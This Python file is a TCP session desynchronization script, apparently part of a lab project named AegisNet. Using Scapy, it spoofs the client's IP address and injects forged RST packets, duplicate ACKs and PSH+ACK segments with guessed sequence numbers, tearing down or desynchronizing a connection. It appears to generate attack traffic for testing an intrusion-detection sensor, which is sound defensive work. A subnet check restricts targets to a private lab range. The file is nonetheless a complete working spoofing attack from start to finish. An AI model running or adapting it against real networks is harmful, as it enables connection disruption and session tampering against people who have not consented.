"""
attacks/tcp_desync.py
---------------------
TCP Session Desynchronization / Blind RST Injection Attack Script.

Injects blind forged TCP packets into an established session between the
victim-client (172.28.0.10) and the target-server (172.28.0.20):
  1. RST injection: Forces the server to tear down the connection.
  2. Sequence-number prediction: Sends a forged data segment with a plausible
     predicted sequence number, causing session desynchronization (Δ_SEQ spike).

The attack forges the source IP as the victim's IP (172.28.0.10) so the server
believes the packet came from the legitimate client.

SAFETY RULE: Only targets addresses within 172.28.0.0/24. Never modifies
iptables or routing outside the lab namespace.

Usage (via docker exec):
    python3 /attacks/tcp_desync.py [--victim-ip 172.28.0.10]
                                   [--server-ip 172.28.0.20]
                                   [--server-port 8080]
                                   [--count 5]
"""

import argparse
import logging
import random
import sys
import time

from scapy.all import IP, TCP, send

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [TCP-DESYNC] %(message)s",
)
logger = logging.getLogger(__name__)

# ── Safety constants ──────────────────────────────────────────────────────────
ALLOWED_SUBNET = "172.28.0."


def _validate_target(ip: str) -> None:
    if not ip.startswith(ALLOWED_SUBNET):
        logger.error(
            "SAFETY ABORT: Target IP %s is outside the lab subnet %s0/24",
            ip,
            ALLOWED_SUBNET,
        )
        sys.exit(1)


def inject_rst(
    victim_ip: str,
    server_ip: str,
    server_port: int,
    src_port: int,
    seq_num: int,
) -> None:
    """
    Inject a forged TCP RST segment spoofing the victim's IP.

    The server receives a RST from what it believes is the legitimate client,
    tearing down the TCP connection.
    """
    pkt = IP(src=victim_ip, dst=server_ip) / TCP(
        sport=src_port,
        dport=server_port,
        flags="R",
        seq=seq_num,
    )
    send(pkt, verbose=False)
    logger.info(
        "RST injected: %s:%d → %s:%d seq=%d",
        victim_ip,
        src_port,
        server_ip,
        server_port,
        seq_num,
    )


def inject_desync_data(
    victim_ip: str,
    server_ip: str,
    server_port: int,
    src_port: int,
    predicted_seq: int,
) -> None:
    """
    Inject a forged TCP PSH+ACK with a predicted sequence number.

    The bogus payload causes the server's expected sequence number to diverge
    from the client's, producing a large Δ_SEQ value detectable by the sensor.
    """
    payload = b"AEGIS-INJECT-DESYNC-" + random.randbytes(32)
    pkt = IP(src=victim_ip, dst=server_ip) / TCP(
        sport=src_port,
        dport=server_port,
        flags="PA",          # PSH + ACK
        seq=predicted_seq,
        ack=predicted_seq + 1,
    ) / payload
    send(pkt, verbose=False)
    logger.info(
        "Desync data injected: %s:%d → %s:%d seq=%d payload_len=%d",
        victim_ip,
        src_port,
        server_ip,
        server_port,
        predicted_seq,
        len(payload),
    )


def inject_duplicate_acks(
    victim_ip: str,
    server_ip: str,
    server_port: int,
    src_port: int,
    seq_num: int,
    ack_num: int,
    count: int = 4,
) -> None:
    """
    Inject duplicate ACK packets to establish duplicate ACK signaling (dup_ack_count >= 3).
    """
    for _ in range(count):
        pkt = IP(src=victim_ip, dst=server_ip) / TCP(
            sport=src_port,
            dport=server_port,
            flags="A",
            seq=seq_num,
            ack=ack_num,
        )
        send(pkt, verbose=False)


def run_tcp_desync(
    victim_ip: str,
    server_ip: str,
    server_port: int,
    count: int,
    interval: float,
) -> None:
    """
    Execute `count` rounds of TCP desynchronization attacks.

    Each round consists of:
      1. A forged RST to kill the existing session.
      2. Duplicate ACKs establishing duplicate ACK signaling.
      3. A forged PSH+ACK with a predicted sequence number in [65000, 90000].

    Parameters
    ----------
    victim_ip:   Source IP to spoof (must be within 172.28.0.0/24).
    server_ip:   Destination server IP (must be within 172.28.0.0/24).
    server_port: Destination TCP port.
    count:       Number of attack iterations.
    interval:    Seconds between iterations.
    """
    _validate_target(victim_ip)
    _validate_target(server_ip)

    logger.info(
        "Starting TCP desync attack: victim=%s server=%s:%d count=%d",
        victim_ip,
        server_ip,
        server_port,
        count,
    )

    for i in range(count):
        # Simulate a plausible ephemeral source port
        src_port = random.randint(32768, 60999)
        # Guess a sequence number near a realistic window
        base_seq = random.randint(100_000, 4_000_000_000)
        # The predicted sequence is offset in the expected attack band [65000, 90000]
        offset = random.randint(65000, 90000)
        predicted_seq = base_seq + offset
        ack_val = predicted_seq + 1

        inject_rst(
            victim_ip=victim_ip,
            server_ip=server_ip,
            server_port=server_port,
            src_port=src_port,
            seq_num=base_seq,
        )
        inject_duplicate_acks(
            victim_ip=victim_ip,
            server_ip=server_ip,
            server_port=server_port,
            src_port=src_port,
            seq_num=base_seq,
            ack_num=ack_val,
            count=4,
        )
        time.sleep(0.05)
        inject_desync_data(
            victim_ip=victim_ip,
            server_ip=server_ip,
            server_port=server_port,
            src_port=src_port,
            predicted_seq=predicted_seq,
        )

        logger.info("Attack iteration %d/%d complete", i + 1, count)
        if i < count - 1:
            time.sleep(interval)

    logger.info("TCP desynchronization attack complete — %d iterations", count)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="AegisNet TCP Session Desync attack script (lab-only)"
    )
    parser.add_argument(
        "--victim-ip",
        default="172.28.0.10",
        help="Victim IP to spoof as source (default: 172.28.0.10)",
    )
    parser.add_argument(
        "--server-ip",
        default="172.28.0.20",
        help="Target server IP (default: 172.28.0.20)",
    )
    parser.add_argument(
        "--server-port",
        type=int,
        default=8080,
        help="Target server TCP port (default: 8080)",
    )
    parser.add_argument(
        "--count",
        type=int,
        default=5,
        help="Number of attack iterations (default: 5)",
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=0.5,
        help="Seconds between iterations (default: 0.5)",
    )
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    run_tcp_desync(
        victim_ip=args.victim_ip,
        server_ip=args.server_ip,
        server_port=args.server_port,
        count=args.count,
        interval=args.interval,
    )
